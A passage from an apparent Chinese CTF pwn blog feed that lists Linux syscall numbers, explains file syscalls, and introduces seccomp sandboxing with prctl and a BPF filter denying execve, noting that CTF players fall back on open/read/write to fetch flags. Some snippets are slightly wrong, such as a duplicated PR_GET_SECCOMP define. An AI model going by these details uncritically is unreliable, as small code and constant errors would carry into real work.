34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_ftime 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_sync 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_kill 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_rename 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_mkdir 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_rmdir 40</span></pre></td></tr></table></figure><h3 id=\"64位系统\"><a class=\"anchor\" href=\"#64位系统\">#</a> 64 位系统</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_64_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_64_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_read 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_write 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_open 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_close 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_stat 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_fstat 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_lstat 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_poll 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_mmap 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_mprotect 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_munmap 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_brk 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigaction 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigprocmask 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigreturn 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_ioctl 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_pread64 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_pwrite64 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_readv 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_writev 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_access 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_pipe 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_select 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_sched_yield 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_mremap 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_msync 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_mincore 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_madvise 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_shmget 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_shmat 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_shmctl 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_dup 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_dup2 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_pause 34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_nanosleep 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_getitimer 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_setitimer 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_sendfile 40</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#define __NR_socket 41</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#define __NR_connect 42</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#define __NR_accept 43</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">#define __NR_sendto 44</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\">#define __NR_recvfrom 45</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">#define __NR_sendmsg 46</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#define __NR_recvmsg 47</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\">#define __NR_shutdown 48</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">#define __NR_bind 49</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#define __NR_listen 50</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">#define __NR_getsockname 51</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">#define __NR_getpeername 52</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\">#define __NR_socketpair 53</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#define __NR_setsockopt 54</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">#define __NR_getsockopt 55</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">#define __NR_clone 56</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">#define __NR_fork 57</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">#define __NR_vfork 58</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#define __NR_execve 59</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">#define __NR_exit 60</span></pre></td></tr></table></figure><p>完整系统调用号:<span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9kcnN5eQ==\">http://t.csdn.cn/drsyy</span></p>\n<h2 id=\"2寄存器传参不同上面已经说明过了\"><a class=\"anchor\" href=\"#2寄存器传参不同上面已经说明过了\">#</a> 2. 寄存器传参不同 (上面已经说明过了)</h2>\n<h2 id=\"3进行系统调用方式不同\"><a class=\"anchor\" href=\"#3进行系统调用方式不同\">#</a> 3. 进行系统调用方式不同</h2>\n<p>32 位系统通过 ** int 0x80 ** 中断进入系统调用</p>\n<p>64 位系统通过 ** syscall ** 命令进入系统调用</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9KejZIbQ==\">http://t.csdn.cn/Jz6Hm</span></p>\n<h1 id=\"五-open-write-read-close的系统调用\"><a class=\"anchor\" href=\"#五-open-write-read-close的系统调用\">#</a> 五、open、write、read、close 的系统调用</h1>\n<h2 id=\"1文件描述符\"><a class=\"anchor\" href=\"#1文件描述符\">#</a> 1. 文件描述符</h2>\n<p>每一个进程都有一个与之相关的文件描述符，它们是一些小值整数，我们可以通过这些文件描述符来访问打开的文件</p>\n<p>一般地，一个程序开始运行时，会自动打开 3 个文件描述符：</p>\n<ul>\n<li>0——–标准输入 ———-stdin</li>\n<li>1——–标准输出 ———-stdout</li>\n<li>2——–标准错误 ———-stderr</li>\n</ul>\n<h2 id=\"2write系统调用\"><a class=\"anchor\" href=\"#2write系统调用\">#</a> 2.write 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>write 系统调用，是把缓存区 buf 中的前 nbytes 字节写入到与文件描述符 <code>flides有关</code> 的文件中，write 系统调用返回的是实际写入到文件中的 <code>字节数</code> 。</p>\n<p>例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> #标准输出流（<span class=\"token number\">1</span>），将aaa输出到屏幕上</pre></td></tr></table></figure><h2 id=\"3read系统调用\"><a class=\"anchor\" href=\"#3read系统调用\">#</a> 3.read 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>read 系统调用，是从与文件描述符 flides 相关联的文件中读取前 nbytes 字节的内容，并且写入到数据区 buf 中。read 系统调用返回的是实际读入的 <code>字节数</code></p>\n<h2 id=\"4open系统调用\"><a class=\"anchor\" href=\"#4open系统调用\">#</a> 4.open 系统调用</h2>\n<p>两种系统调用方式</p>\n<h3 id=\"第一种\"><a class=\"anchor\" href=\"#第一种\">#</a> 第一种</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>path<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> oflags<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>将准备打开的文件或是设备的名字作为参数 path 传给函数，oflags 用来指定文件访问模式。open 系统调用成功返回一个新的文件描述符，失败返回 - 1。</p>\n<p>其中，oflags 是由必需文件访问模式和可选模式一起构成的 (通过按位或 “|”)：</p>\n<p>必需部分：</p>\n<ul>\n<li>O_RDONLY------ 以只读方式打开</li>\n<li>O_WRONLY------ 以只写方式打开</li>\n<li>O_RDWR -------- 以读写方式打开</li>\n</ul>\n<p>例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> f<span class=\"token operator\">=</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file.c\"</span><span class=\"token punctuation\">,</span>O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 以只读方式打开文件</span></pre></td></tr></table></figure><h3 id=\"第二种\"><a class=\"anchor\" href=\"#第二种\">#</a> 第二种</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>path<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> oflags<span class=\"token punctuation\">,</span> <span class=\"token class-name\">mode_t</span> mode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在第一种调用方式上，加上了第三个参数 mode，主要是搭配 O_CREAT 使用，同样地，这个参数规定了属主、同组和其他人对文件的文件操作权限。</p>\n<h2 id=\"5close系统调用\"><a class=\"anchor\" href=\"#5close系统调用\">#</a> 5.close 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>终止文件描述符 flides 与其对应的文件间的联系，文件描述符被释放，可重新使用。</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/%E6%B2%99%E7%9B%92%E6%9C%BA%E5%88%B6/",
            "url": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/%E6%B2%99%E7%9B%92%E6%9C%BA%E5%88%B6/",
            "title": "沙盒机制",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h1>\n<p>沙盒机制也就是我们常说的沙箱，英文名 <code>sandbox</code> ，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。</p>\n<p>在 ctf 比赛中，pwn 题中的沙盒一般都会限制 <code>execve</code>  的系统调用，这样一来 <code>one_gadget</code>  和 <code>system</code>  调用都不好使，只能采取 <code>open/read/write</code>  的组合方式来读取 flag。当然有些题目可能还会将上面三个系统调用砍掉一个，进一步限制我们获取到 flag.</p>\n<h1 id=\"1prctl函数调用\"><a class=\"anchor\" href=\"#1prctl函数调用\">#</a> 1.prctl 函数调用</h1>\n<p>prctl 是进程管理函数，沙箱规则通过 prctl 函数实现（也可以通过 seccomp 库函数实现），由它决定了哪些 <code>系统调用函数</code> 能被调用哪些不能被调用</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 函数原型</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> option<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg4<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>option 选项有很多，剩下的参数也由 option 确定，这里介绍两个主要的 option<br />\n <code>PR_SET_NO_NEW_PRIVS(38)</code>  和  <code>PR_SET_SECCOMP(22)</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Get/set process seccomp mode */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_SECCOMP</span>      <span class=\"token expression\"><span class=\"token number\">21</span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_SECCOMP</span>     <span class=\"token expression\"><span class=\"token number\">22</span></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * 用 22 时一般只允许 read、write、exit、sigereturn 函数执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> * If no_new_privs is set, then operations that grant new privileges (i.e.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> * execve) will either fail or not grant them.  This affects suid/sgid,</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> * file capabilities, and LSMs.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> * Operations that merely manipulate or drop existing privileges (setresuid,</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> * capset, etc.) will still work.  Drop those privileges if you want them gone.</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"14\"></td><td><pre> * Changing LSM security domain is considered a new privilege.  So, for example,</pre></td></tr><tr><td data-num=\"15\"></td><td><pre> * asking selinux for a specific new context (e.g. with runcon) will result</pre></td></tr><tr><td data-num=\"16\"></td><td><pre> * in execve returning -EPERM.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"18\"></td><td><pre> * See Documentation/userspace-api/no_new_privs.rst for more details.</pre></td></tr><tr><td data-num=\"19\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_SET_NO_NEW_PRIVS</span>    <span class=\"token expression\"><span class=\"token number\">38</span></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_NO_NEW_PRIVS</span>    <span class=\"token expression\"><span class=\"token number\">39</span></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// 为 38 时一般禁用 execve</span></pre></td></tr></table></figure><p>1.option 为 22 的情况 ( <code>#define PR_GET_SECCOMP     22</code> )</p>\n<ul>\n<li><code>第二个参数为1</code> ，只允许调用 <code>read/write/_exit(not exit_group)/sigreturn</code>  这几个 <code>syscall(系统调用)</code> :  <code>prctl(22,1LL,&amp;V1)</code></li>\n<li>第二个参数为 2，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则:  <code>prctl(22, 2LL, &amp;v1);</code> (第二个参数为 2 时，则会利用 <code>参数3</code>  的指向的 <code>sock_fprog结构体</code>  的成员指向的 <code>sock_filter</code>  定义的规则来进行过滤 <code>任意系统调用和系统调用参数</code> ，通过这种方式我们可以自己定义想要过滤的系统调用)</li>\n</ul>\n<p>2.option 为 38 的情况 ( <code>#define PR_SET_NO_NEW_PRIVS    38</code> )</p>\n<ul>\n<li><code>第二个参数设置为1</code> ，则禁用 execve 系统调用且可以通过 fork () 函数和 clone () 函数 <code>继承给子进程</code> :  <code>prctl(38, 1LL, 0LL, 0LL, 0LL);</code></li>\n<li><code>第二个参数设置为2</code> ，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则</li>\n</ul>\n<h2 id=\"bpf过滤规则伯克利封装包过滤\"><a class=\"anchor\" href=\"#bpf过滤规则伯克利封装包过滤\">#</a> BPF 过滤规则（伯克利封装包过滤）</h2>\n<p>上面提到的 <code>PT_SET_SECCOMP</code>  这个参数，后面接到的第一个参数，就是它设置的模式，第三个参数，指向 <code>sock_fprog结构体</code> ，sock_fprog 结构体中，又有指向 <code>sock_filter结构体</code> 的指针 ( <code>struct sock_filter *filter; /*指向包含struct sock_filter的结构体数组指针*/</code> )，sock_filter 结构体这里，就是我们要设置 <code>规则</code> 的地方</p>\n<p>这里利用别人定义的 <code>sock_filter</code> :</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stddef.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/seccomp.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/filter.h></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;sys/prctl.h></span>    </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/bpf.h></span>             <span class=\"token comment\">//off 和 imm 都是有符号类型，编码信息定义在内核头文件 linux/bpf.h</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 结构体数组</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD<span class=\"token operator\">|</span>BPF_W<span class=\"token operator\">|</span>BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// 从第 0 个字节开始，传送 4 个字节</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP<span class=\"token operator\">|</span>BPF_JEQ<span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 比较是否为 59（execve 的系统调用号），是就跳过下一行（进入到下面的异常处理），如果不是，就执行下一行，第三个参数表示执行正确的指令跳转，第四个参数表示执行错误的指令跳转</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP<span class=\"token operator\">|</span>BPF_JGE<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">//      BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">//        杀死一个进程</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\">//        BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_TRACE),</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">//        父进程追踪子进程，具体没太搞清楚</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                 <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET<span class=\"token operator\">+</span>BPF_K<span class=\"token punctuation\">,</span>SECCOMP_RET_ERRNO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">//        异常处理</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET<span class=\"token operator\">+</span>BPF_K<span class=\"token punctuation\">,</span>SECCOMP_RET_ALLOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\">//        这里表示系统调用如果正常，允许系统调用</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_fprog</span> prog<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token punctuation\">.</span>len<span class=\"token operator\">=</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>sock_filter<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td 